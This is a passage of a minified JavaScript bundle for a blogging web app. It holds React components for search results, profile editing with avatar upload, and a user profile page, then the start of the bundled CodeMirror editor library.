py-12",children:o.jsx("div",{className:"inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900"})}):a.length>0?o.jsxs(o.Fragment,{children:[a.map(_=>{var M,R;return o.jsx("article",{className:"border-b border-gray-200 pb-8",children:o.jsx(we,{to:`/post/${_.slug}`,children:o.jsxs("div",{className:"group cursor-pointer",children:[o.jsxs("div",{className:"flex items-center gap-2 mb-3",children:[_.authorAvatarUrl?o.jsx("img",{src:_.authorAvatarUrl,alt:_.authorDisplayName,className:"w-6 h-6 rounded-full object-cover"}):o.jsx("div",{className:"w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center text-xs font-semibold text-gray-600",children:((M=_.authorDisplayName)==null?void 0:M.charAt(0))||"U"}),o.jsx("span",{className:"text-sm text-gray-900",children:_.authorDisplayName})]}),o.jsxs("div",{className:"flex gap-6",children:[o.jsxs("div",{className:"flex-1",children:[o.jsx("h2",{className:"text-xl font-bold text-gray-900 mb-2 group-hover:text-gray-600 transition-colors line-clamp-2",children:_.title}),o.jsxs("p",{className:"text-gray-600 text-base mb-4 line-clamp-2",children:[_.summary||((R=_.content)==null?void 0:R.substring(0,150)),"..."]}),o.jsxs("div",{className:"flex items-center gap-4 text-sm text-gray-500",children:[_.publishedAt&&o.jsx("time",{dateTime:_.publishedAt,children:Ui(new Date(_.publishedAt),"MMM dd, yyyy")}),_.categoryName&&o.jsx("span",{className:"px-2 py-0.5 bg-gray-100 text-gray-700 rounded text-xs",children:_.categoryName})]})]}),_.coverImageUrl&&o.jsx("div",{className:"w-28 h-28 flex-shrink-0",children:o.jsx("img",{src:_.coverImageUrl,alt:_.title,className:"w-full h-full object-cover rounded-sm"})})]})]})})},_.id)}),b<C-1&&o.jsx("div",{className:"text-center pt-8",children:o.jsx("button",{onClick:A,disabled:x,className:"text-blue-600 hover:text-blue-800 font-medium disabled:opacity-50",children:x?"Loading...":"Show more results"})})]}):o.jsxs("div",{className:"text-center py-12",children:[o.jsx(Xr,{className:"h-12 w-12 text-gray-300 mx-auto mb-4"}),o.jsxs("p",{className:"text-gray-500 text-lg",children:['No stories found for "',t,'"']})]})}),n==="authors"&&o.jsx("div",{className:"space-y-4",children:x?o.jsx("div",{className:"text-center py-12",children:o.jsx("div",{className:"inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900"})}):u.length>0?u.map(_=>{var M;return o.jsxs("div",{className:"flex items-center justify-between p-4 bg-gray-50 rounded-lg hover:bg-gray-100 transition-colors",children:[o.jsxs(we,{to:`/author/${_.username}`,className:"flex items-center gap-4 flex-1",children:[_.avatarUrl?o.jsx("img",{src:_.avatarUrl,alt:_.displayName,className:"w-12 h-12 rounded-full object-cover"}):o.jsx("div",{className:"w-12 h-12 rounded-full bg-gray-300 flex items-center justify-center text-lg font-semibold text-gray-600",children:((M=_.displayName)==null?void 0:M.charAt(0))||"U"}),o.jsxs("div",{children:[o.jsx("h3",{className:"font-semibold text-gray-900 hover:text-blue-600",children:_.displayName}),o.jsxs("p",{className:"text-sm text-gray-500",children:["@",_.username]}),_.bio&&o.jsx("p",{className:"text-sm text-gray-600 mt-1 line-clamp-1",children:_.bio})]})]}),o.jsx(Uf,{username:_.username,size:"sm"})]},_.id)}):o.jsxs("div",{className:"text-center py-12",children:[o.jsx(ff,{className:"h-12 w-12 text-gray-300 mx-auto mb-4"}),o.jsxs("p",{className:"text-gray-500 text-lg",children:['No authors found for "',t,'"']})]})}),n==="categories"&&o.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:x?o.jsx("div",{className:"col-span-2 text-center py-12",children:o.jsx("div",{className:"inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900"})}):h.length>0?h.map(_=>o.jsx(we,{to:`/category/${_.slug||_.name.toLowerCase()}`,className:"p-6 bg-gradient-to-br from-gray-50 to-gray-100 rounded-lg hover:shadow-md transition-all border border-gray-200 hover:border-gray-300",children:o.jsxs("div",{className:"flex items-start gap-3",children:[o.jsx(xl,{className:"h-6 w-6 text-purple-500 flex-shrink-0 mt-1"}),o.jsxs("div",{children:[o.jsx("h3",{className:"font-semibold text-gray-900 text-lg mb-1",children:_.name}),_.description&&o.jsx("p",{className:"text-sm text-gray-600 line-clamp-2",children:_.description}),_.postCount!==void 0&&o.jsxs("p",{className:"text-xs text-gray-500 mt-2",children:[_.postCount," ",_.postCount===1?"post":"posts"]})]})]})},_.id)):o.jsxs("div",{className:"col-span-2 text-center py-12",children:[o.jsx(xl,{className:"h-12 w-12 text-gray-300 mx-auto mb-4"}),o.jsxs("p",{className:"text-gray-500 text-lg",children:['No categories found for "',t,'"']})]})})]})}):o.jsx("div",{className:"min-h-screen bg-white py-12",children:o.jsx("div",{className:"max-w-4xl mx-auto px-6",children:o.jsxs("div",{className:"text-center",children:[o.jsx(Al,{className:"h-16 w-16 text-gray-300 mx-auto mb-4"}),o.jsx("h1",{className:"text-3xl font-semibold mb-4",children:"Explore"}),o.jsx("p",{className:"text-gray-500",children:"Use the search bar above to find stories, authors, and categories."})]})})})}function F_({user:e,onClose:t}){var O,N,T,A;const{updateUser:n}=Gt(),[r,a]=j.useState(!1),[l,u]=j.useState(""),[f,h]=j.useState(!1),[m,x]=j.useState({displayName:e.displayName||"",bio:e.bio||"",about:e.about||"",avatarUrl:e.avatarUrl||""}),[g,b]=j.useState(e.avatarUrl||""),E=_=>{x({...m,[_.target.name]:_.target.value})},C=async _=>{var B,U,$;const M=_.target.files[0];if(!M)return;if(!M.type.startsWith("image/")){u("Please select an image file");return}if(M.size>5*1024*1024){u("Image size must be less than 5MB");return}const R=new FileReader;R.onloadend=()=>{b(R.result)},R.readAsDataURL(M),h(!0),u("");try{const Y=new FormData;Y.append("file",M);const ne=await _e.post("/api/users/me/avatar",Y);x({...m,avatarUrl:ne.data.avatarUrl});try{const Z={...e,avatarUrl:ne.data.avatarUrl};localStorage.setItem("user",JSON.stringify(Z)),n({avatarUrl:ne.data.avatarUrl})}catch(Z){console.error("Failed to update user after avatar upload",Z)}}catch(Y){console.error("Avatar upload error:",Y),console.error("Error response:",Y.response),console.error("Error data:",(B=Y.response)==null?void 0:B.data),u((($=(U=Y.response)==null?void 0:U.data)==null?void 0:$.message)||Y.message||"Failed to upload avatar"),b(e.avatarUrl||"")}finally{h(!1)}},P=async _=>{var M,R;_.preventDefault(),a(!0),u("");try{console.log("Submitting profile update:",m);const B=await _e.patch("/api/users/me",m);console.log("Profile updated successfully:",B.data);const U={...e,...m};localStorage.setItem("user",JSON.stringify(U)),n(m),t()}catch(B){console.error("Update profile error:",B.response||B),u(((R=(M=B.response)==null?void 0:M.data)==null?void 0:R.message)||"Failed to update profile"),a(!1)}};return o.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4",children:o.jsxs("div",{className:"bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto",children:[o.jsxs("div",{className:"sticky top-0 bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-between",children:[o.jsx("h2",{className:"text-xl font-bold text-gray-900",children:"Edit Profile"}),o.jsx("button",{onClick:t,className:"text-gray-400 hover:text-gray-600 transition-colors",children:o.jsx(Bi,{className:"h-6 w-6"})})]}),l&&o.jsx("div",{className:"mx-6 mt-4 p-4 bg-red-50 border border-red-200 rounded-md",children:o.jsx("p",{className:"text-sm text-red-800",children:l})}),o.jsxs("form",{onSubmit:P,className:"p-6 space-y-6",children:[o.jsxs("div",{className:"flex items-center space-x-6",children:[o.jsxs("div",{className:"flex-shrink-0 relative",children:[g?o.jsx("img",{src:g,alt:"Avatar preview",className:"h-24 w-24 rounded-full object-cover"}):o.jsx("div",{className:"h-24 w-24 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center text-white text-4xl font-bold",children:((N=(O=m.displayName)==null?void 0:O[0])==null?void 0:N.toUpperCase())||((A=(T=e.username)==null?void 0:T[0])==null?void 0:A.toUpperCase())}),f&&o.jsx("div",{className:"absolute inset-0 bg-black bg-opacity-50 rounded-full flex items-center justify-center",children:o.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-white"})})]}),o.jsxs("div",{className:"flex-1",children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Profile Picture"}),o.jsx("input",{type:"file",accept:"image/*",onChange:C,disabled:f,className:`block w-full text-sm text-gray-500\r
                  file:mr-4 file:py-2 file:px-4\r
                  file:rounded-md file:border-0\r
                  file:text-sm file:font-semibold\r
                  file:bg-blue-50 file:text-blue-700\r
                  hover:file:bg-blue-100\r
                  disabled:opacity-50 disabled:cursor-not-allowed`}),o.jsx("p",{className:"text-xs text-gray-500 mt-1",children:"JPG, PNG or GIF (max 5MB)"})]})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Display Name"}),o.jsx("input",{type:"text",name:"displayName",value:m.displayName,onChange:E,required:!0,minLength:1,maxLength:100,className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",placeholder:"Your display name"})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Bio (Short description)"}),o.jsx("textarea",{name:"bio",value:m.bio,onChange:E,rows:2,maxLength:500,className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",placeholder:"A short bio about yourself..."}),o.jsxs("p",{className:"text-xs text-gray-500 mt-1",children:[m.bio.length,"/500 characters  Displayed under your name"]})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"About (Full description)"}),o.jsx("textarea",{name:"about",value:m.about,onChange:E,rows:8,maxLength:5e3,className:"w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500",placeholder:"Write a longer description about yourself, your interests, or your work..."}),o.jsxs("p",{className:"text-xs text-gray-500 mt-1",children:[m.about.length,"/5000 characters  Displayed in About tab"]})]}),o.jsxs("div",{className:"border-t pt-6",children:[o.jsx("p",{className:"text-sm text-gray-600 mb-4",children:"Cannot be changed:"}),o.jsxs("div",{className:"space-y-3",children:[o.jsxs("div",{children:[o.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Username"}),o.jsxs("p",{className:"text-sm text-gray-900",children:["@",e.username]})]}),o.jsxs("div",{children:[o.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Email"}),o.jsx("p",{className:"text-sm text-gray-900",children:e.email})]})]})]}),o.jsx("div",{className:"border-t pt-6",children:o.jsx(we,{to:"/change-password",onClick:t,children:o.jsxs(Ee,{type:"button",variant:"outline",className:"w-full gap-2",children:[o.jsx(g_,{className:"h-4 w-4"}),"Change Password"]})})}),o.jsxs("div",{className:"flex items-center space-x-3 pt-4",children:[o.jsxs(Ee,{type:"submit",disabled:r,className:"flex-1",children:[o.jsx(Bl,{className:"h-4 w-4 mr-2"}),r?"Saving...":"Save Changes"]}),o.jsx(Ee,{type:"button",onClick:t,variant:"outline",className:"flex-1",disabled:r,children:"Cancel"})]})]})]})})}function M_(){var N;const{user:e}=Gt(),[t,n]=j.useState(!1),[r,a]=j.useState([]),[l,u]=j.useState(!0),[f,h]=j.useState(0),[m,x]=j.useState(0),[g,b]=j.useState("home"),{followersCount:E,followingCount:C,initialLoading:P}=Zg(e==null?void 0:e.username);j.useEffect(()=>{e&&O()},[e,f]);const O=async()=>{try{u(!0);const T=await _e.get("/api/posts/my-posts",{params:{page:f,size:10,sort:"createdAt,desc"}});a(T.data.content||[]),x(T.data.totalPages||0)}catch(T){console.error("Failed to fetch posts:",T)}finally{u(!1)}};return e?o.jsxs(o.Fragment,{children:[o.jsx("div",{className:"min-h-screen bg-white",children:o.jsx("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8",children:o.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-8",children:[o.jsxs("div",{className:"lg:col-span-2",children:[o.jsx("div",{className:"mb-8",children:o.jsxs("div",{className:"flex items-start justify-between",children:[o.jsx("h1",{className:"text-4xl font-bold text-gray-900",children:e.displayName}),o.jsxs(Ee,{onClick:()=>n(!0),variant:"outline",size:"sm",className:"gap-2",children:[o.jsx(ec,{className:"h-4 w-4"}),"Settings"]})]})}),o.jsx("div",{className:"border-b border-gray-200 mb-6",children:o.jsxs("nav",{className:"-mb-px flex space-x-8",children:[o.jsx("button",{onClick:()=>b("home"),className:`${g==="home"?"border-gray-900 text-gray-900":"border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"} border-b-2 py-4 px-1 text-sm font-medium transition-colors`,children:"Home"}),o.jsx("button",{onClick:()=>b("about"),className:`${g==="about"?"border-gray-900 text-gray-900":"border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"} border-b-2 py-4 px-1 text-sm font-medium transition-colors`,children:"About"})]})}),g==="home"?o.jsxs("div",{children:[l?o.jsx("div",{className:"text-center py-12",children:o.jsx("div",{className:"inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-gray-900"})}):r.length===0?o.jsxs("div",{className:"text-center py-12",children:[o.jsx("p",{className:"text-gray-500 mb-4",children:"You haven't written any stories yet."}),o.jsx(we,{to:"/write",children:o.jsx(Ee,{children:"Write Your First Story"})})]}):o.jsx("div",{className:"space-y-4",children:r.map(T=>o.jsxs("div",{className:"relative",children:[o.jsx(Hf,{post:T}),o.jsx("div",{className:"absolute top-4 right-4 flex items-center space-x-2 bg-white/90 rounded-lg p-1",children:o.jsx(Ee,{variant:"ghost",size:"sm",asChild:!0,children:o.jsx(we,{to:`/edit/${T.id}`,children:o.jsx(xa,{className:"h-4 w-4"})})})})]},T.id))}),m>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-8 pt-8 border-t",children:[o.jsx(Ee,{variant:"outline",onClick:()=>h(T=>Math.max(0,T-1)),disabled:f===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:[f+1," / ",m]}),o.jsx(Ee,{variant:"outline",onClick:()=>h(T=>Math.min(m-1,T+1)),disabled:f>=m-1,children:"Next"})]})]}):o.jsxs("div",{className:"prose max-w-none",children:[o.jsxs("h2",{children:["About ",e.displayName]}),e.about?o.jsx("div",{className:"whitespace-pre-wrap",children:e.about}):o.jsx("p",{className:"text-gray-500",children:"No about section yet."})]})]}),o.jsx("div",{className:"lg:col-span-1",children:o.jsxs("div",{className:"sticky top-8",children:[o.jsxs("div",{className:"text-center mb-6",children:[e.avatarUrl?o.jsx("img",{src:e.avatarUrl,alt:e.displayName,className:"w-24 h-24 rounded-full object-cover mx-auto mb-4 border-2 border-gray-200"}):o.jsx("div",{className:"w-24 h-24 rounded-full bg-gray-200 flex items-center justify-center mx-auto mb-4 text-3xl font-bold text-gray-600",children:((N=e.displayName)==null?void 0:N.charAt(0))||"U"}),o.jsx("h2",{className:"text-xl font-bold text-gray-900 mb-1",children:e.displayName}),o.jsxs("p",{className:"text-gray-500 text-sm mb-2",children:[r.length," ",r.length===1?"Story":"Stories"]}),o.jsxs("div",{className:"flex justify-center gap-6 mb-4",children:[o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"text-lg font-bold text-gray-900",children:P?"-":E}),o.jsx("div",{className:"text-xs text-gray-500",children:"Followers"})]}),o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"text-lg font-bold text-gray-900",children:P?"-":C}),o.jsx("div",{className:"text-xs text-gray-500",children:"Following"})]})]}),o.jsxs(Ee,{onClick:()=>n(!0),variant:"outline",size:"sm",className:"w-full gap-2",children:[o.jsx(Gg,{className:"h-4 w-4"}),"Edit Profile"]})]}),o.jsx("div",{className:"bg-gray-50 rounded-lg p-4 mb-4",children:o.jsxs("div",{className:"space-y-3",children:[e.email&&o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:[o.jsx(Nl,{className:"h-4 w-4 flex-shrink-0"}),o.jsx("span",{className:"truncate",children:e.email})]}),o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:[o.jsx(Zu,{className:"h-4 w-4 flex-shrink-0"}),o.jsxs("span",{children:["Joined ",Ui(new Date(e.createdAt||new Date),"MMM yyyy")]})]})]})}),o.jsxs("div",{className:"space-y-2",children:[o.jsx(we,{to:"/write",children:o.jsx(Ee,{variant:"outline",className:"w-full justify-start",children:"Write a story"})}),o.jsx(we,{to:"/dashboard",children:o.jsx(Ee,{variant:"outline",className:"w-full justify-start",children:"Stories"})})]})]})})]})})}),t&&o.jsx(F_,{user:e,onClose:()=>n(!1)})]}):o.jsx("div",{className:"min-h-screen flex items-center justify-center",children:o.jsx("p",{children:"Loading..."})})}var kk={exports:{}};(function(e,t){(function(n,r){e.exports=r()})(du,function(){var n=navigator.userAgent,r=navigator.platform,a=/gecko\/\d/i.test(n),l=/MSIE \d/.test(n),u=/Trident\/(?:[7-9]|\d{2,})\..*rv:(\d+)/.exec(n),f=/Edge\/(\d+)/.exec(n),h=l||u||f,m=h&&(l?document.documentMode||6:+(f||u)[1]),x=!f&&/WebKit\//.test(n),g=x&&/Qt\/\d+\.\d+/.test(n),b=!f&&/Chrome\/(\d+)/.exec(n),E=b&&+b[1],C=/Opera\//.test(n),P=/Apple Computer/.test(navigator.vendor),O=/Mac OS X 1\d\D([8-9]|\d\d)\D/.test(n),N=/PhantomJS/.test(n),T=P&&(/Mobile\/\w+/.test(n)||navigator.maxTouchPoints>2),A=/Android/.test(n),_=T||A||/webOS|BlackBerry|Opera Mini|Opera Mobi|IEMobile/i.test(n),M=T||/Mac/.test(r),R=/\bCrOS\b/.test(n),B=/win/i.test(r),U=C&&n.match(/Version\/(\d*\.\d*)/);U&&(U=Number(U[1])),U&&U>=15&&(C=!1,x=!0);var $=M&&(g||C&&(U==null||U<12.11)),Y=a||h&&m>=9;function ne(i){return new RegExp("(^|\\s)"+i+"(?:$|\\s)\\s*")}var Z=function(i,s){var d=i.className,c=ne(s).exec(d);if(c){var p=d.slice(c.index+c[0].length);i.className=d.slice(0,c.index)+(p?c[1]+p:"")}};function me(i){for(var s=i.childNodes.length;s>0;--s)i.removeChild(i.firstChild);return i}function ye(i,s){return me(i).appendChild(s)}function J(i,s,d,c){var p=document.createElement(i);if(d&&(p.className=d),c&&(p.style.cssText=c),typeof s=="string")p.appendChild(document.createTextNode(s));else if(s)for(var y=0;y<s.length;++y)p.appendChild(s[y]);return p}function pe(i,s,d,c){var p=J(i,s,d,c);return p.setAttribute("role","presentation"),p}var oe;document.createRange?oe=function(i,s,d,c){var p=document.createRange();return p.setEnd(c||i,d),p.setStart(i,s),p}:oe=function(i,s,d){var c=document.body.createTextRange();try{c.moveToElementText(i.parentNode)}catch{return c}return c.collapse(!0),c.moveEnd("character",d),c.moveStart("character",s),c};function ae(i,s){if(s.nodeType==3&&(s=s.parentNode),i.contains)return i.contains(s);do if(s.nodeType==11&&(s=s.host),s==i)return!0;while(s=s.parentNode)}function xe(i){var s=i.ownerDocument||i,d;try{d=i.activeElement}catch{d=s.body||null}for(;d&&d.shadowRoot&&d.shadowRoot.activeElement;)d=d.shadowRoot.activeElement;return d}function q(i,s){var d=i.className;ne(s).test(d)||(i.className+=(d?" ":"")+s)}function We(i,s){for(var d=i.split(" "),c=0;c<d.length;c++)d[c]&&!ne(d[c]).test(s)&&(s+=" "+d[c]);return s}var Q=function(i){i.select()};T?Q=function(i){i.selectionStart=0,i.selectionEnd=i.value.length}:h&&(Q=function(i){try{i.select()}catch{}});function k(i){return i.display.wrapper.ownerDocument}function se(i){return Ve(i.display.wrapper)}function Ve(i){return i.getRootNode?i.getRootNode():i.ownerDocument}function De(i){return k(i).defaultView}function Ke(i){var s=Array.prototype.slice.call(arguments,1);return function(){return i.apply(null,s)}}function vt(i,s,d){s||(s={});for(var c in i)i.hasOwnProperty(c)&&(d!==!1||!s.hasOwnProperty(c))&&(s[c]=i[c]);return s}function lt(i,s,d,c,p){s==null&&(s=i.search(/[^\s\u00a0]/),s==-1&&(s=i.length));for(var y=c||0,w=p||0;;){var S=i.indexOf("	",y);if(S<0||S>=s)return w+(s-y);w+=S-y,w+=d-w%d,y=S+1}}var Tt=function(){this.id=null,this.f=null,this.time=0,this.handler=Ke(this.onTimeout,this)};Tt.prototype.onTimeout=function(i){i.id=0,i.time<=+new Date?i.f():setTimeout(i.handler,i.time-+new Date)},Tt.prototype.set=function(i,s){this.f=s;var d=+new Date+i;(!this.id||d<this.time)&&(clearTimeout(this.id),this.id=setTimeout(this.handler,i),this.time=d)};function ut(i,s){for(var d=0;d<i.length;++d)if(i[d]==s)return d;return-1}var bt=50,Mt={toString:function(){return"CodeMirror.Pass"}},nn={scroll:!1},$e={origin:"*mouse"},Hn={origin:"+move"};function Un(i,s,d){for(var c=0,p=0;;){var y=i.indexOf("	",c);y==-1&&(y=i.length);var w=y-c;if(y==i.length||p+w>=s)return c+Math.min(w,s-p);if(p+=y-c,p+=d-p%d,c=y+1,p>=s)return c}}var zn=[""];function fr(i){for(;zn.length<=i;)zn.push(it(zn)+" ");return zn[i]}function it(i){return i[i.length-1]}function Wn(i,s){for(var d=[],c=0;c<i.length;c++)d[c]=s(i[c],c);return d}function Tr(i,s,d){for(var c=0,p=d(s);c<i.length&&d(i[c])<=p;)c++;i.splice(c,0,s)}function Wi(){}function le(i,s){var d;return Object.create?d=Object.create(i):(Wi.prototype=i,d=new Wi),s&&vt(s,d),d}var ue=/[\u00df\u0587\u0590-\u05f4\u0600-\u06ff\u3040-\u309f\u30a0-\u30ff\u3400-\u4db5\u4e00-\u9fcc\uac00-\ud7af]/;function H(i){return/\w/.test(i)||i>""&&(i.toUpperCase()!=i.toLowerCase()||ue.test(i))}function L(i,s){return s?s.source.indexOf("\\w")>-1&&H(i)?!0:s.test(i):H(i)}function F(i){for(var s in i)if(i.hasOwnProperty(s)&&i[s])return!1;return!0}var X=/[\u0300-\u036f\u0483-\u0489\u0591-\u05bd\u05bf\u05c1\u05c2\u05c4\u05c5\u05c7\u0610-\u061a\u064b-\u065e\u0670\u06d6-\u06dc\u06de-\u06e4\u06e7\u06e8\u06ea-\u06ed\u0711\u0730-\u074a\u07a6-\u07b0\u07eb-\u07f3\u0816-\u0819\u081b-\u0823\u0825-\u0827\u0829-\u082d\u0900-\u0902\u093c\u0941-\u0948\u094d\u0951-\u0955\u0962\u0963\u0981\u09bc\u09be\u09c1-\u09c4\u09cd\u09d7\u09e2\u09e3\u0a01\u0a02\u0a3c\u0a41\u0a42\u0a47\u0a48\u0a4b-\u0a4d\u0a51\u0a70\u0a71\u0a75\u0a81\u0a82\u0abc\u0ac1-\u0ac5\u0ac7\u0ac8\u0acd\u0ae2\u0ae3\u0b01\u0b3c\u0b3e\u0b3f\u0b41-\u0b44\u0b4d\u0b56\u0b57\u0b62\u0b63\u0b82\u0bbe\u0bc0\u0bcd\u0bd7\u0c3e-\u0c40\u0c46-\u0c48\u0c4a-\u0c4d\u0c55\u0c56\u0c62\u0c63\u0cbc\u0cbf\u0cc2\u0cc6\u0ccc\u0ccd\u0cd5\u0cd6\u0ce2\u0ce3\u0d3e\u0d41-\u0d44\u0d4d\u0d57\u0d62\u0d63\u0dca\u0dcf\u0dd2-\u0dd4\u0dd6\u0ddf\u0e31\u0e34-\u0e3a\u0e47-\u0e4e\u0eb1\u0eb4-\u0eb9\u0ebb\u0ebc\u0ec8-\u0ecd\u0f18\u0f19\u0f35\u0f37\u0f39\u0f71-\u0f7e\u0f80-\u0f84\u0f86\u0f87\u0f90-\u0f97\u0f99-\u0fbc\u0fc6\u102d-\u1030\u1032-\u1037\u1039\u103a\u103d\u103e\u1058\u1059\u105e-\u1060\u1071-\u1074\u1082\u1085\u1086\u108d\u109d\u135f\u1712-\u1714\u1732-\u1734\u1752\u1753\u1772\u1773\u17b7-\u17bd\u17c6\u17c9-\u17d3\u17dd\u180b-\u180d\u18a9\u1920-\u1922\u1927\u1928\u1932\u1939-\u193b\u1a17\u1a18\u1a56\u1a58-\u1a5e\u1a60\u1a62\u1a65-\u1a6c\u1a73-\u1a7c\u1a7f\u1b00-\u1b03\u1b34\u1b36-\u1b3a\u1b3c\u1b42\u1b6b-\u1b73\u1b80\u1b81\u1ba2-\u1ba5\u1ba8\u1ba9\u1c2c-\u1c33\u1c36\u1c37\u1cd0-\u1cd2\u1cd4-\u1ce0\u1ce2-\u1ce8\u1ced\u1dc0-\u1de6\u1dfd-\u1dff\u200c\u200d\u20d0-\u20f0\u2cef-\u2cf1\u2de0-\u2dff\u302a-\u302f\u3099\u309a\ua66f-\ua672\ua67c\ua67d\ua6f0\ua6f1\ua802\ua806\ua80b\ua825\ua826\ua8c4\ua8e0-\ua8f1\ua926-\ua92d\ua947-\ua951\ua980-\ua982\ua9b3\ua9b6-\ua9b9\ua9bc\uaa29-\uaa2e\uaa31\uaa32\uaa35\uaa36\uaa43\uaa4c\uaab0\uaab2-\uaab4\uaab7\uaab8\uaabe\uaabf\uaac1\uabe5\uabe8\uabed\udc00-\udfff\ufb1e\ufe00-\ufe0f\ufe20-\ufe26\uff9e\uff9f]/;function G(i){return i.charCodeAt(0)>=768&&X.test(i)}function te(i,s,d){for(;(d<0?s>0:s<i.length)&&G(i.charAt(s));)s+=d;return s}function Ce(i,s,d){for(var c=s>d?-1:1;;){if(s==d)return s;var p=(s+d)/2,y=c<0?Math.ceil(p):Math.floor(p);if(y==s)return i(y)?s:d;i(y)?d=y:s=y+c}}function je(i,s,d,c){if(!i)return c(s,d,"ltr",0);for(var p=!1,y=0;y<i.length;++y){var w=i[y];(w.from<d&&w.to>s||s==d&&w.to==s)&&(c(Math.max(w.from,s),Math.min(w.to,d),w.level==1?"rtl":"ltr",y),p=!0)}p||c(s,d,"ltr")}var Re=null;function Be(i,s,d){var c;Re=null;for(var p=0;p<i.length;++p){var y=i[p];if(y.from<s&&y.to>s)return p;y.to==s&&(y.from!=y.to&&d=="before"?c=p:Re=p),y.from==s&&(y.from!=y.to&&d!="before"?c=p:Re=p)}return c??Re}var Ue=function(){var i="bbbbbbbbbtstwsbbbbbbbbbbbbbbssstwNN%%%NNNNNN,N,N1111111111NNNNNNNLLLLLLLLLLLLLLLLLLLLLLLLLLNNNNNNLLLLLLLLLLLLLLLLLLLLLLLLLLNNNNbbbbbbsbbbbbbbbbbbbbbbbbbbbbbbbbb,N%%%%NNNNLNNNNN%%11NLNNN1LNNNNNLLLLLLLLLLLLLLLLLLLLLLLNLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLN",s="nnnnnnNNr%%r,rNNmmmmmmmmmmmrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrmmmmmmmmmmmmmmmmmmmmmnnnnnnnnnn%nnrrrmrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrmmmmmmmnNmmmmmmrrmmNmmmmrr1111111111";function d(I){return I<=247?i.charAt(I):1424<=I&&I<=1524?"R":1536<=I&&I<=1785?s.charAt(I-1536):1774<=I&&I<=2220?"r":8192<=I&&I<=8203?"w":I==8204?"b":"L"}var c=/[\u0590-\u05f4\u0600-\u06ff\u0700-\u08ac]/,p=/[stwN]/,y=/[LRr]/,w=/[Lb1n]/,S=/[1n]/;function D(I,W,K){this.level=I,this.from=W,this.to=K}return function(I,W){var K=W=="ltr"?"L":"R";if(I.length==0||W=="ltr"&&!c.test(I))return!1;for(var ie=I.length,re=[],de=0;de<ie;++de)re.push(d(I.charCodeAt(de)));for(var ge=0,ke=K;ge<ie;++ge){var Ie=re[ge];Ie=="m"?re[ge]=ke:ke=Ie}for(var Oe=0,Pe=K;Oe<ie;++Oe){var Me=re[Oe];Me=="1"&&Pe=="r"?re[Oe]="n":y.test(Me)&&(Pe=Me,Me=="r"&&(re[Oe]="R"))}for(var Qe=1,Ge=re[0];Qe<ie-1;++Qe){var nt=re[Qe];nt=="+"&&Ge=="1"&&re[Qe+1]=="1"?re[Qe]="1":nt==","&&Ge==re[Qe+1]&&(Ge=="1"||Ge=="n")&&(re[Qe]=Ge),Ge=nt}for(var Nt=0;Nt<ie;++Nt){var fn=re[Nt];if(fn==",")re[Nt]="N";else if(fn=="%"){var Ht=void 0;for(Ht=Nt+1;Ht<ie&&re[Ht]=="%";++Ht);for(var nr=Nt&&re[Nt-1]=="!"||Ht<ie&&re[Ht]=="1"?"1":"N",Yn=Nt;Yn<Ht;++Yn)re[Yn]=nr;Nt=Ht-1}}for(var Zt=0,Vn=K;Zt<ie;++Zt){var xn=re[Zt];Vn=="L"&&xn=="1"?re[Zt]="L":y.test(xn)&&(Vn=xn)}for(var an=0;an<ie;++an)if(p.test(re[an])){var Jt=void 0;for(Jt=an+1;Jt<ie&&p.test(re[Jt]);++Jt);for(var qt=(an?re[an-1]:K)=="L",Gn=(Jt<ie?re[Jt]:K)=="L",zs=qt==Gn?qt?"L":"R":K,Ji=an;Ji<Jt;++Ji)re[Ji]=zs;an=Jt-1}for(var Sn=[],ii,hn=0;hn<ie;)if(w.test(re[hn])){var wp=hn;for(++hn;hn<ie&&w.test(re[hn]);++hn);Sn.push(new D(0,wp,hn))}else{var Ei=hn,Va=Sn.length,Ga=W=="rtl"?1:0;for(++hn;hn<ie&&re[hn]!="L";++hn);for(var In=Ei;In<hn;)if(S.test(re[In])){Ei<In&&(Sn.splice(Va,0,new D(1,Ei,In)),Va+=Ga);var Ws=In;for(++In;In<hn&&S.test(re[In]);++In);Sn.splice(Va,0,new D(2,Ws,In)),Va+=Ga,Ei=In}else++In;Ei<hn&&Sn.splice(Va,0,new 